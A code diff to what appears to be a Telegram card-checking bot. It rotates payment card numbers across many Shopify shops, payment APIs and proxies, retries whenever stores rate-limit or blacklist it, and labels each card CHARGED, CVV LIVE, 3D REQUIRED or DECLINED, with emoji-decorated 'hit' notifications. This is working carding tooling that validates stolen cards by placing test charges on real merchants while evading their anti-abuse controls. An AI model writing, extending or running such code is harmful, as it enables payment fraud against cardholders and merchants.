@@ -7666,8 +7666,13 @@ async def parse_paypal_response(response_json: dict, elapsed: float, proxy: str 
     # ============ CHECK FOR NO SESSION / SITE ERROR (Retryable) ============
     retryable_patterns = [
         "NO_SESSION_TOKEN", "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "HTTP Error: 404", "Throttled", "Throttled",
-        "TIMEOUT", "INVALID_PROXY", "SESSION_EXPIRED", "RATE_LIMIT",  "404", 
-        "TOO_MANY_REQUESTS", "SERVICE_UNAVAILABLE", "BAD_GATEWAY"
+        "TIMEOUT", "INVALID_PROXY", "SESSION_EXPIRED", "RATE_LIMIT",  "404", "SITE ERROR! STATUS: 401",
+        "TOO_MANY_REQUESTS", "SERVICE_UNAVAILABLE", "BAD_GATEWAY" "401 AUTH FAILED", "AUTH FAILED", "IP_BLACKLISTED", 
+    "ip_blacklisted", "AUTHENTICATION FAILED", "INVALID PROXY",
+    "PROXY AUTHENTICATION FAILED", "UNAUTHORIZED", "HTTP 401" "407", "PROXY AUTHENTICATION REQUIRED", "407 PROXY AUTHENTICATION REQUIRED",
+    "401 AUTH FAILED", "AUTH FAILED", "IP_BLACKLISTED", 
+    "ip_blacklisted", "AUTHENTICATION FAILED", "INVALID PROXY",
+    "PROXY AUTHENTICATION FAILED", "UNAUTHORIZED", "HTTP 401", "HTTP 407"
     ]
     
     for pattern in retryable_patterns:
@@ -12107,6 +12112,8 @@ SHOPIFY_API_POOL = [
 
 # ============ SHOPIFY API POOL MANAGER - FIXED WITH PROXY ROTATION ============
 
+# ============ SHOPIFY API POOL MANAGER - WITH SITE ROTATION ============
+
 class ShopifyAPIPool:
     """
     Rotates between multiple Shopify APIs to distribute load
@@ -12158,6 +12165,7 @@ class ShopifyAPIPool:
         for api in self.apis:
             print(f"   • {api['name']}: {api['url']} (weight: {api.get('weight', 1)})")
         print(f"📊 Loaded performance data for {len(self.site_performance)} sites")
+        print(f"🔄 Site rotation: GOOD sites first, then normal sites, pure round-robin")
     
     def _load_site_performance(self):
         """Load site performance data from file"""
@@ -12214,7 +12222,7 @@ class ShopifyAPIPool:
             print(f"🚫 [SITE TRACKING] Rate limit #{stats['rate_limits']} for {site}")
             
             # ============ REMOVE SITE AFTER 20 RATE LIMITS ============
-            if stats['rate_limits'] >= 10000:
+            if stats['rate_limits'] >= 20:
                 print(f"🗑️ [SITE REMOVAL] Site {site} removed due to 20+ rate limits (429 errors)")
                 autosopi_site_manager.remove_site(site, OWNER_ID)
                 # Also remove from performance tracking
@@ -12257,37 +12265,44 @@ class ShopifyAPIPool:
         self.good_sites_cache = [s['site'] for s in good_sites]
         self.good_sites_cache_time = time.time()
         
-        print(f"📊 [SITE PRIORITY] Found {len(self.good_sites_cache)} good sites")
-        if self.good_sites_cache:
-            print(f"   Top sites: {self.good_sites_cache[:5]}")
+        # Also update the SiteRotationManager's GOOD sites
+        # This ensures SiteRotationManager has the latest GOOD sites
+        if len(self.good_sites_cache) > 0:
+            print(f"📊 [SITE PRIORITY] Found {len(self.good_sites_cache)} good sites")
+            if len(self.good_sites_cache) > 5:
+                print(f"   Top sites: {self.good_sites_cache[:5]}")
         
         return self.good_sites_cache
     
-    def _get_next_site_prioritized(self, tried_sites: list) -> Optional[str]:
+    def _get_next_site_from_manager(self, tried_sites: list = None) -> Optional[str]:
         """
-        Get the next site with priority for GOOD sites
-        Falls back to normal rotation if no good sites available
+        Get the next site using SiteRotationManager.
+        This ensures pure round-robin rotation across ALL sites.
         """
-        # First, try to get a good site that hasn't been tried yet
-        good_sites = self._get_good_sites_prioritized()
+        if tried_sites is None:
+            tried_sites = []
         
-        for site in good_sites:
-            if site not in tried_sites:
-                print(f"🌟 [SITE SELECTION] Using prioritized GOOD site: {site}")
-                return site
+        # Use SiteRotationManager to get the next site
+        site = site_rotation_manager.get_next_site()
         
-        # No good sites available or all tried - use normal rotation
-        # Get ALL sites from autosopi manager
-        all_sites = autosopi_site_manager.sites.copy()
+        # If site was already tried, skip it and get another
+        if site and site in tried_sites:
+            print(f"⚠️ [Site Rotation] Site {site} already tried, getting next...")
+            # Force the manager to advance
+            site_rotation_manager.get_next_site()  # This advances the index
+            # Try again
+            site = site_rotation_manager.get_next_site()
         
-        # Try each site that hasn't been tried yet
-        for site in all_sites:
-            if site not in tried_sites:
-                print(f"🔄 [SITE SELECTION] Using site: {site}")
-                return site
+        # Log which type of site we're using
+        if site:
+            good_sites = site_rotation_manager._get_good_sites()
+            if site in good_sites:
+                price = site_quality_tracker.get_site_price(site)
+                print(f"🌟 [SITE SELECTION] Using prioritized GOOD site: {site} (${price:.2f})")
+            else:
+                print(f"📌 [SITE SELECTION] Using normal site: {site}")
         
-        # All sites tried - return None
-        return None
+        return site
     
     async def get_session(self):
         """Get or create HTTP session"""
@@ -12402,129 +12417,83 @@ class ShopifyAPIPool:
     
     async def check_card_with_pool(self, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
         """
-        Check a card using the best available API from the pool
-        RETRY UNTIL ALL SITES ARE EXHAUSTED (no hard limit)
-        PROXY ROTATION on retry to avoid rate limiting
-        GOOD sites are prioritized for future cards
-        429 errors are tracked - sites with 20+ 429 errors are removed
+        Check a card using the best available API from the pool.
+        Uses SiteRotationManager for proper round-robin site selection.
         """
-        tried_sites = []  # Start empty - we'll track all sites tried
-        tried_proxies = [proxy] if proxy else []  # Track tried proxies
-        rate_limit_count = 0  # Track consecutive 429 errors
-        good_responses = 0  # Track good responses for this card
+        tried_sites = []
+        tried_proxies = [proxy] if proxy else []
         attempt = 0
+        max_attempts = 50  # Max attempts before giving up
         
-        # ============ GET PROXIES FOR THIS USER ============
+        # Get proxies for this user
         user_proxies = []
-        global_proxies = []
-        
-        # Check if global proxy only mode is enabled
-        if GLOBAL_PROXY_ONLY_MODE:
-            # Only use global proxies
-            if global_proxy_pool.enabled and global_proxy_pool.proxies:
-                global_proxies = global_proxy_pool.proxies.copy()
-                print(f"🌐 [GLOBAL ONLY] Using {len(global_proxies)} global proxies")
-                user_proxies = global_proxies
-            else:
-                print(f"⚠️ [GLOBAL ONLY] No global proxies available")
-        else:
-            # Normal mode - user's personal proxies first
-            if user_id and user_id in autosopi_proxy_tracker.working_proxies:
+        if user_id:
+            if user_id in autosopi_proxy_tracker.working_proxies:
                 user_proxies = autosopi_proxy_tracker.working_proxies.get(user_id, [])
-                print(f"👤 [User Proxies] Found {len(user_proxies)} working proxies for user {user_id}")
-            
-            # Fallback to global proxies if user has none
-            if not user_proxies and global_proxy_pool.enabled and global_proxy_pool.proxies:
-                user_proxies = global_proxy_pool.proxies.copy()
-                print(f"🌐 [Fallback] Using {len(user_proxies)} global proxies as fallback")
         
-        # Remove the initial proxy from the list if it's there
-        if proxy and proxy in user_proxies and len(user_proxies) > 1:
-            user_proxies = [p for p in user_proxies if p != proxy]
-            print(f"🔄 Removed initial proxy from rotation pool")
+        # Initialize with the provided site if any
+        if site:
+            tried_sites.append(site)
+            print(f"📍 Initial site: {site}")
         
-        if user_proxies:
-            print(f"🔄 [PROXY ROTATION] {len(user_proxies)} proxies available for rotation")
-            for i, p in enumerate(user_proxies[:5]):
-                print(f"   {i+1}. {mask_proxy(p)}")
-            if len(user_proxies) > 5:
-                print(f"   ... and {len(user_proxies) - 5} more")
-        else:
-            print(f"⚠️ No proxies available, using direct connection")
-        
-        # ============ FIX: Get ALL sites from autosopi manager ============
-        all_sites = autosopi_site_manager.sites.copy()
-        total_sites = len(all_sites)
-        
-        print(f"📊 [API POOL] Total sites available: {total_sites}")
-        
-        # Start with the initial site
-        current_site = site
-        tried_sites.append(site)
-        
-        while True:
+        while attempt < max_attempts:
             attempt += 1
             
-            # ============ FIX: Check if we've tried ALL sites ============
-            if len(tried_sites) >= total_sites:
-                print(f"❌ [API POOL] All {total_sites} sites have been tried. Stopping.")
-                print(f"📊 Sites tried: {len(tried_sites)}/{total_sites}")
-                break
+            # ============ GET SITE USING ROTATION MANAGER ============
+            if attempt == 1 and site:
+                current_site = site
+            else:
+                # Get next site from rotation
+                current_site = site_rotation_manager.get_next_site()
+                
+                # If no site available, break
+                if not current_site:
+                    print(f"❌ [API POOL] No more sites available after {attempt} attempts")
+                    break
+                
+                # Check if site was already tried
+                if current_site in tried_sites:
+                    print(f"⚠️ [API POOL] Site {current_site} already tried, getting next...")
+                    # Force advance the rotation
+                    site_rotation_manager.get_next_site()
+                    current_site = site_rotation_manager.get_next_site()
+                    if current_site in tried_sites:
+                        # Still got a tried site, continue loop to get next
+                        continue
             
-            # Get a new API for each attempt
+            tried_sites.append(current_site)
+            
+            # ============ GET PROXY (ROTATE ON RETRY) ============
+            current_proxy = None
+            if user_proxies:
+                # Rotate through proxies
+                if attempt > 1:
+                    # Try a different proxy on retry
+                    tried_proxies_set = set(tried_proxies)
+                    available_proxies = [p for p in user_proxies if p not in tried_proxies_set]
+                    if available_proxies:
+                        current_proxy = available_proxies[0]
+                        tried_proxies.append(current_proxy)
+                        print(f"🔄 [ATTEMPT #{attempt}] Rotating to NEW proxy: {mask_proxy(current_proxy)}")
+                    elif user_proxies:
+                        # All proxies tried, recycle
+                        current_proxy = user_proxies[attempt % len(user_proxies)]
+                        print(f"🔄 [ATTEMPT #{attempt}] Recycling proxy: {mask_proxy(current_proxy)}")
+                else:
+                    # First attempt: use provided proxy or first available
+                    if proxy:
+                        current_proxy = proxy
+                    elif user_proxies:
+                        current_proxy = user_proxies[0]
+                        tried_proxies.append(current_proxy)
+            
+            # Log the attempt
+            print(f"\n🔍 [API POOL] Attempt {attempt} using: {current_site}")
+            print(f"📊 Sites tried: {len(tried_sites)}/{len(autosopi_site_manager.sites)}")
+            
+            # Get API for this attempt
             api = await self.get_next_api()
             api_name = api["name"]
-            
-            # ============ FIX: Get next site that hasn't been tried ============
-            # First, try to get a good site that hasn't been tried
-            new_site = None
-            good_sites = self._get_good_sites_prioritized()
-            
-            for site in good_sites:
-                if site not in tried_sites:
-                    new_site = site
-                    print(f"🌟 [SITE SELECTION] Using prioritized GOOD site: {site}")
-                    break
-            
-            # If no good sites left, try any untested site
-            if not new_site:
-                for site in all_sites:
-                    if site not in tried_sites:
-                        new_site = site
-                        print(f"🔄 [SITE SELECTION] Using untested site: {site}")
-                        break
-            
-            # If we found a new site, use it
-            if new_site:
-                current_site = new_site
-                tried_sites.append(new_site)
-                print(f"🔄 [ATTEMPT #{attempt}] Trying site: {current_site}")
-            else:
-                # All sites tried - break
-                print(f"❌ [API POOL] No untested sites found. Stopping.")
-                break
-            
-            # ============ PROXY ROTATION ON RETRY ============
-            current_proxy = proxy
-            found_new_proxy = False
-            
-            if user_proxies:
-                if attempt > 1:
-                    for p in user_proxies:
-                        if p not in tried_proxies:
-                            current_proxy = p
-                            tried_proxies.append(p)
-                            print(f"🔄 [ATTEMPT #{attempt}] Rotating to NEW proxy: {mask_proxy(current_proxy)}")
-                            found_new_proxy = True
-                            break
-                
-                # If all proxies tried, recycle one
-                if not found_new_proxy and user_proxies:
-                    current_proxy = user_proxies[attempt % len(user_proxies)]
-                    print(f"🔄 [ATTEMPT #{attempt}] Recycling proxy: {mask_proxy(current_proxy)}")
-            
-            print(f"\n🔍 [API POOL] Attempt {attempt} using: {api_name} (Site: {current_site})")
-            print(f"📊 Sites tried: {len(tried_sites)}/{total_sites}")
             
             start_time = time.time()
             
@@ -12537,205 +12506,109 @@ class ShopifyAPIPool:
                     self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 
-                # Check if site was removed (from _make_api_request)
+                # Check if site was removed
                 if result.get("site_removed", False):
-                    print(f"🗑️ [API POOL] Site {current_site} was removed due to error")
-                    # Remove from tried_sites so we don't count it
-                    if current_site in tried_sites:
-                        tried_sites.remove(current_site)
-                    self.mark_api_result(api_name, False, elapsed, True)
+                    print(f"🗑️ [API POOL] Site {current_site} was removed")
                     continue
                 
                 response_text = result.get("message", "")
                 response_upper = response_text.upper()
                 status_category = result.get("status_category", "")
                 
-                # Check for no products errors
-                no_products_indicators = [
-                    "No products under $10",
-                    "No products under $10 found!",
-                    "NO PRODUCTS UNDER $10"
-                ]
-                
-                is_no_products = any(indicator in response_upper for indicator in no_products_indicators)
-                
-                if is_no_products:
-                    print(f"🔄 [RETRY] No products under $10 for site {current_site}, trying next site...")
-                    site_quality_tracker.record_response(current_site, response_text, "no_products", price=999.99)
-                    self.mark_api_result(api_name, False, elapsed, True)
-                    continue
-                
-                # ============ CHECK FOR GOOD RESPONSE ============
-                is_good_response = self._is_good_response(response_text)
-                
-                if is_good_response:
-                    good_responses += 1
-                    print(f"🌟 [GOOD RESPONSE] {current_site} returned good response #{good_responses}")
-                    # Update site performance
-                    self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
-                    
-                    # Mark proxy as working if it returned a good response
-                    if current_proxy and user_id:
-                        if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
-                            autosopi_proxy_tracker.record_proxy_result(user_id, current_proxy, response_text, elapsed)
-                
                 # ============ CHECK FOR 429 RATE LIMIT ============
-                is_rate_limit = "429" in response_text or "Site Error! Status: 429" in response_text
+                is_rate_limit = "429" in response_text or "Site Error! Status: 429" in response_text or "Cart failed with status 429" in response_text
                 
                 if is_rate_limit:
-                    rate_limit_count += 1
-                    print(f"🚫 [RATE LIMIT] 429 detected! (count: {rate_limit_count})")
-                    
-                    # Check if this site is GOOD - if yes, don't count it as rate-limited
-                    if site_quality_tracker.is_good_site(current_site) or self.site_performance.get(current_site, {}).get('is_good', False):
-                        print(f"🌟 [SITE PROTECTION] Site {current_site} is GOOD - NOT counting this 429 against it")
-                    else:
-                        # Update site performance with rate limit (only for non-GOOD sites)
-                        self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=True)
-                    
-                    # Mark proxy as rate limited
-                    if current_proxy and user_id:
-                        if hasattr(autosopi_proxy_tracker, 'mark_rate_limited'):
-                            autosopi_proxy_tracker.mark_rate_limited(user_id, current_proxy, 120)
-                        if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
-                            autosopi_proxy_tracker.record_proxy_result(user_id, current_proxy, response_text, elapsed)
-                    
-                    # Continue to next site
+                    print(f"🚫 [RATE LIMIT] 429 detected for site {current_site}")
+                    # Update site performance (tracking only, no cooldown)
+                    self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=True)
                     self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
-                    print(f"🔄 [API POOL] 429 detected, trying next site...")
+                    # Continue to next site - SiteRotationManager will handle rotation
                     continue
-                
-                # Reset rate limit counter on successful response
-                rate_limit_count = 0
-                
-                # ============ CHECK FOR SITE REMOVAL ERRORS ============
-                is_site_removal_error = False
-                for removal_error in SITE_REMOVAL_ERRORS:
-                    if removal_error.upper() in response_upper:
-                        is_site_removal_error = True
-                        print(f"⚠️ [API POOL] Site removal error detected: {removal_error} for site {current_site}")
-                        break
-                
-                if is_site_removal_error:
-                    # Check if site is GOOD - if yes, DON'T remove
-                    if site_quality_tracker.is_good_site(current_site) or self.site_performance.get(current_site, {}).get('is_good', False):
-                        print(f"🌟 [SITE PROTECTION] Site {current_site} is GOOD - NOT removing despite error")
-                    else:
-                        print(f"🗑️ [SITE REMOVAL] Removing bad site: {current_site}")
-                        autosopi_site_manager.remove_site(current_site, OWNER_ID)
-                        if current_site in self.site_performance:
-                            del self.site_performance[current_site]
-                        self.good_sites_cache_time = 0
-                        self.mark_api_result(api_name, False, elapsed, True)
-                    continue
-                
-                # ============ REAL CARD DECLINE PATTERNS (FINAL, NO RETRY) ============
-                real_decline_patterns = [
-                    "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS", "FRAUD_SUSPECTED","GENERIC_ERROR", 
-                    "EXPIRED CARD", "DO NOT HONOR", "LOST CARD", "STOLEN CARD","GENERIC_ERROR",
-                    "RESTRICTED CARD", "PAYMENTS_CREDIT_CARD_GENERIC",
-                    "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
-                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
-                    "PAYMENTS_CREDIT_CARD_NOT_SUPPORTED",
-                    "PAYMENT_METHOD_NOT_ACCEPTED",
-                ]
-                
-                is_real_decline = any(pattern in response_upper for pattern in real_decline_patterns)
-                
-                if is_real_decline:
-                    self.mark_api_result(api_name, True, elapsed, False)
-                    result["api_used"] = api_name
-                    result["api_attempt"] = attempt
-                    result["status"] = "declined"
-                    result["status_category"] = "declined"
-                    result["status_display"] = "❌ DECLINED"
-                    print(f"❌ [API POOL] Card DECLINED - final response")
-                    return result
-                
-                # ============ CHECK FOR CHARGED ============
-                if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]):
-                    self.mark_api_result(api_name, True, elapsed, False)
-                    result["api_used"] = api_name
-                    result["api_attempt"] = attempt
-                    result["status_category"] = "charged"
-                    result["status_display"] = "🔥 CHARGED 🔥"
-                    print(f"🔥 [API POOL] CHARGED detected!")
-                    return result
-                
-                # ============ CHECK FOR 3D/OTP ============
-                if any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]):
-                    self.mark_api_result(api_name, True, elapsed, False)
-                    result["api_used"] = api_name
-                    result["api_attempt"] = attempt
-                    result["status_category"] = "approved"
-                    result["status_display"] = "🔐 3D REQUIRED"
-                    print(f"🔐 [API POOL] 3D REQUIRED detected!")
-                    return result
-                
-                # ============ CHECK FOR INSUFFICIENT FUNDS ============
-                if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
-                    self.mark_api_result(api_name, True, elapsed, False)
-                    result["api_used"] = api_name
-                    result["api_attempt"] = attempt
-                    result["status_category"] = "approved"
-                    result["status_display"] = "💰 INSUFFICIENT FUNDS"
-                    print(f"💰 [API POOL] INSUFFICIENT FUNDS detected!")
-                    return result
-                
-                # ============ CHECK FOR CVV LIVE ============
-                if "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
-                    self.mark_api_result(api_name, True, elapsed, False)
-                    result["api_used"] = api_name
-                    result["api_attempt"] = attempt
-                    result["status_category"] = "approved"
-                    result["status_display"] = "✅ CVV LIVE"
-                    print(f"✅ [API POOL] CVV LIVE detected!")
-                    return result
                 
                 # ============ CHECK FOR RETRYABLE ERRORS ============
                 retryable_patterns = [
-                    "NO VALID PAYMENT METHOD FOUND", "No products under $3 found!", "No products", "UNKNOWN",
-                    "FAILED TO GET SESSION TOKEN","Throttled", "Throttled",
-                    "DECISION_RULE_BLOCK", "Unable to get payment token: 422, message='Attempt", "Unable to get payment token: 422",
-                    "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429",
-                    "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
-                    "MERCHANDISE_EXPECTED_PRICE_MISMATCH","<b>No Valid Products</b>","VALIDATION_CUSTOM",
-                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","No Valid Products","403", "<b>No products under $3 found!</b>",
-                    "INVALID_PAYMENT_METHOD", "Site not supported", "<b>No Valid Products</b>",
-                    "NO VARIANTS", "GENERIC_ERROR", "No Valid Products","VALIDATION_CUSTOM",
-                    "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT",
-                    "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE",
-                    "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
-                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED", "PAYMENT_METHOD_NOT_ACCEPTED",
-                    "Cart failed with status 429", "SITE ERROR! STATUS: 429",
-                    "HTTP Error: 404", "HTTP Error: 403", "HTTP Error: 401", "404",
-                    "SITE ERROR! STATUS: 404", "Cart failed with status 403",
+                    "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
+                    "CART FAILED WITH STATUS", "SITE ERROR! STATUS", 
+                    "MERCHANDISE_EXPECTED_PRICE_MISMATCH", 
+                    "Throttled", "TIMEOUT", "CONNECTION ERROR",
+                    "PROXY DEAD", "SITE DEAD", "SERVER DISCONNECTED",
+                    "Invalid JSON", "HTML", "EMPTY_RESPONSE",
+                    "NO_SESSION_TOKEN", "SITE DEAD", "PROXY DEAD"
                 ]
                 
-                is_retryable_error = any(pattern in response_upper for pattern in retryable_patterns)
+                is_retryable = any(pattern in response_upper for pattern in retryable_patterns)
                 
-                if is_retryable_error:
+                if is_retryable:
                     print(f"🔄 [API POOL] Retryable error: {response_text[:100]}")
+                    # Mark as retryable
                     self.mark_api_result(api_name, False, elapsed, True)
+                    # Continue to next site
                     continue
-                else:
-                    # Not retryable - treat as declined
+                
+                # ============ CHECK FOR CHARGED/APPROVED ============
+                charged_patterns = ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]
+                approved_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "CVV LIVE", "INSUFFICIENT"]
+                
+                if any(p in response_upper for p in charged_patterns):
+                    # Success - card charged
+                    self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
                     self.mark_api_result(api_name, True, elapsed, False)
+                    result["api_used"] = api_name
+                    result["api_attempt"] = attempt
+                    result["site_used"] = current_site
+                    print(f"🔥 [API POOL] CHARGED on attempt {attempt} with site {current_site}")
+                    return result
+                
+                if any(p in response_upper for p in approved_patterns):
+                    # Success - card approved/live
+                    self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
+                    self.mark_api_result(api_name, True, elapsed, False)
+                    result["api_used"] = api_name
+                    result["api_attempt"] = attempt
+                    result["site_used"] = current_site
+                    print(f"✅ [API POOL] APPROVED on attempt {attempt} with site {current_site}")
+                    return result
+                
+                # ============ CHECK FOR DECLINED (FINAL) ============
+                decline_patterns = ["CARD_DECLINED", "DECLINED", "DO NOT HONOR", "EXPIRED", "GENERIC_ERROR"]
+                
+                if any(p in response_upper for p in decline_patterns):
+                    # Card is declined - final response
+                    self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=False)
+                    self.mark_api_result(api_name, True, elapsed, False)
+                    result["api_used"] = api_name
+                    result["api_attempt"] = attempt
+                    result["site_used"] = current_site
                     result["status"] = "declined"
                     result["status_category"] = "declined"
                     result["status_display"] = "❌ DECLINED"
-                    print(f"❌ [API POOL] Card DECLINED on attempt {attempt}")
+                    print(f"❌ [API POOL] Card DECLINED on attempt {attempt} with site {current_site}")
                     return result
                 
+                # Unknown response - treat as declined
+                print(f"❌ [API POOL] Unknown response - treating as DECLINED: {response_text[:100]}")
+                result["api_used"] = api_name
+                result["api_attempt"] = attempt
+                result["site_used"] = current_site
+                result["status"] = "declined"
+                result["status_category"] = "declined"
+                result["status_display"] = "❌ DECLINED"
+                return result
+                
+            except httpx.TimeoutException:
+                elapsed = time.time() - start_time
+                self.mark_api_result(api_name, False, elapsed, True)
+                print(f"⏰ [API POOL] Timeout on {api_name}, trying next site...")
+                continue
             except Exception as e:
                 elapsed = time.time() - start_time
                 self.mark_api_result(api_name, False, elapsed, True)
-                print(f"❌ [API POOL] {api_name} error: {str(e)[:100]}")
-                # Continue to next site on error
+                print(f"❌ [API POOL] {api_name} error: {str(e)[:100]}, trying next site...")
                 continue
         
-        # All sites exhausted
-        print(f"❌ [API POOL] All {total_sites} sites exhausted for card {card[:20]}...")
+        # All attempts exhausted
+        print(f"❌ [API POOL] All {attempt} attempts exhausted for card {card[:20]}...")
         return {
             "status": "declined",
             "result": "DECLINED",
@@ -12750,7 +12623,6 @@ class ShopifyAPIPool:
     async def _make_api_request(self, api: dict, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
         """
         Make request to a specific API with proxy support
-        FIXED: Better proxy handling with 407 authentication retry
         """
         
         # Parse card
@@ -12792,9 +12664,6 @@ class ShopifyAPIPool:
             print(f"📤 Params: site=https://{site_clean}, cc={formatted_card[:20]}...")
             
             # ============ FIX: Better proxy handling ============
-            # Don't add proxy as a parameter - use httpx client proxy instead
-            # This avoids format issues
-            
             client_kwargs = {
                 'timeout': httpx.Timeout(45.0, connect=15.0, read=40.0),
                 'verify': False,
@@ -12898,15 +12767,6 @@ class ShopifyAPIPool:
                 print(f"⚠️ JSON parse error: {e}")
                 # Check if response is HTML (site error page)
                 if response.text and ('<html' in response.text[:100] or '<!DOCTYPE' in response.text[:100]):
-                    if site_quality_tracker.is_good_site(site_clean) or self.site_performance.get(site_clean, {}).get('is_good', False):
-                        print(f"🌟 [SITE PROTECTION] Site {site_clean} is GOOD - NOT removing despite HTML error")
-                    else:
-                        print(f"🗑️ HTML response (site error) - Removing site: {site_clean}")
-                        autosopi_site_manager.remove_site(site_clean, OWNER_ID)
-                        if site_clean in self.site_performance:
-                            del self.site_performance[site_clean]
-                        self.good_sites_cache_time = 0
-                        site_removed = True
                     return {
                         "status": "error",
                         "result": "HTML_ERROR",
@@ -12942,13 +12802,8 @@ class ShopifyAPIPool:
                     if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
                         autosopi_proxy_tracker.record_proxy_result(user_id, proxy, response_text, elapsed)
                 
-                # Check if this is a GOOD site - don't count 429 against it
-                is_good_site = site_quality_tracker.is_good_site(site_clean) or self.site_performance.get(site_clean, {}).get('is_good', False)
-                
-                if is_good_site:
-                    print(f"🌟 [SITE PROTECTION] Site {site_clean} is GOOD - NOT counting this 429 against it")
-                else:
-                    self._update_site_performance(site_clean, response_text, is_good=False, is_rate_limit=True)
+                # Update site performance (tracking only)
+                self._update_site_performance(site_clean, response_text, is_good=False, is_rate_limit=True)
                 
                 return {
                     "status": "error",
@@ -13112,7 +12967,7 @@ class ShopifyAPIPool:
             
             # ============ RETRYABLE ERRORS ============
             retryable_patterns = [
-                "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN","Throttled", "Throttled",
+                "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
                 "DECISION_RULE_BLOCK", "No products under $3 found!", "<b>No products under $3 found!</b>",
                 "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429",
                 "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
@@ -13127,7 +12982,11 @@ class ShopifyAPIPool:
                 "SITE ERROR! STATUS: 429", "Cart failed with status",
                 "HTTP Error: 404", "HTTP Error: 403", "HTTP Error: 401", "404",
                 "SITE ERROR! STATUS: 404", "Cart failed with status 403",
-                "PROXY_AUTH_FAILED",  # Add this so 407 triggers retry
+                "PROXY_AUTH_FAILED", "Throttled", "Throttled",
+                "401 AUTH FAILED", "AUTH FAILED", "IP_BLACKLISTED",
+                "ip_blacklisted", "AUTHENTICATION FAILED", "INVALID PROXY",
+                "PROXY AUTHENTICATION FAILED", "UNAUTHORIZED", "HTTP 401", "HTTP 407",
+                "407", "PROXY AUTHENTICATION REQUIRED", "407 PROXY AUTHENTICATION REQUIRED",
             ]
             
             is_retryable = any(pattern in response_upper for pattern in retryable_patterns)
@@ -13242,8 +13101,9 @@ class ShopifyAPIPool:
             result += f"   ├─ Avg Time: {stats.get('avg_response_time', 0):.2f}s\n"
             result += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
         
-        # Add site performance summary
-        result += "\n" + self.get_site_performance_stats()
+        # Add site rotation status
+        result += "\n" + site_rotation_manager.get_stats()
+        result += "\n\n" + self.get_site_performance_stats()
         
         return result
     
@@ -13252,8 +13112,10 @@ class ShopifyAPIPool:
         if self.session:
             await self.session.aclose()
             self.session = None
+
 # Create global instance
 shopify_api_pool = ShopifyAPIPool()
+
 
 
 
@@ -17040,7 +16902,7 @@ async def send_hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "diamond": "5427168083074628963",  # 💎
             "fire": "5471133374264684999",      # 🔥
             "skull": "5042167377869932162",      # 💀
-            "target": "5256131095094652290",     # 🎯
+            "target": "5377336227533969892",     # 🎯
             "alien": "5869573060030683138",      # 👾
             "money": "6002386288612653951",      # 🙈
             "smile": "6230927657257668107",      # 😁
@@ -17192,7 +17054,7 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
     # ============ YOUR ACTUAL PREMIUM EMOJI IDs ============
     PREMIUM_EMOJI_IDS = {
         "skull": "5042167377869932162",
-        "target": "5256131095094652290",
+        "target": "5377336227533969892",
         "toy": "5249244862359812334",
         "diamond": "5427168083074628963",
         "flower": "6230927657257668107",
@@ -17272,7 +17134,7 @@ PREMIUM_EMOJI_IDS = {
     # Gateway emojis
     "paypal": "5039670412733055750",        # 🔥 (or get PayPal specific)
     "shopify": "5041796412954641308",      # 💎
-    "razorpay": "5256131095094652290",     # 🎯
+    "razorpay": "5377336227533969892",     # 🎯
     "stripe": "5368324170671202286",       # 💳
     "autosopi": "5869573060030683138",     # 👾
     "payflow": "6230927657257668107",      # 💸
@@ -17298,7 +17160,7 @@ PREMIUM_EMOJI_IDS = {
     "star": "6282793227057632654",         # ⭐
     "trophy": "5188344996356448758",       # 🏆
     
-    "time": "5256131095094652290",
+    "time": "5377336227533969892" ,
     "target": "5249244862359812334",
     "flash": "5397857289216484878",
     "skull": "5042167377869932162",
@@ -20988,7 +20850,272 @@ async def single_check_ezycourse(update: Update, context: ContextTypes.DEFAULT_T
         ezycourse_active_tasks.pop(user_id, None)
 
 
+# ============ SITE ROTATION MANAGER (NO COOLDOWN) ============
 
+class SiteRotationManager:
+    """
+    Manages pure round-robin site rotation with GOOD sites priority.
+    NO COOLDOWN - sites are never skipped due to 429 errors.
+    
+    Rotation order:
+    1. GOOD sites (round-robin, sorted by price)
+    2. Normal sites (round-robin)
+    3. Repeat from step 1
+    
+    This ensures EVERY site gets used in rotation.
+    """
+    
+    def __init__(self):
+        self.good_sites_index = 0
+        self.normal_sites_index = 0
+        self.good_sites_cache = []
+        self.normal_sites_cache = []
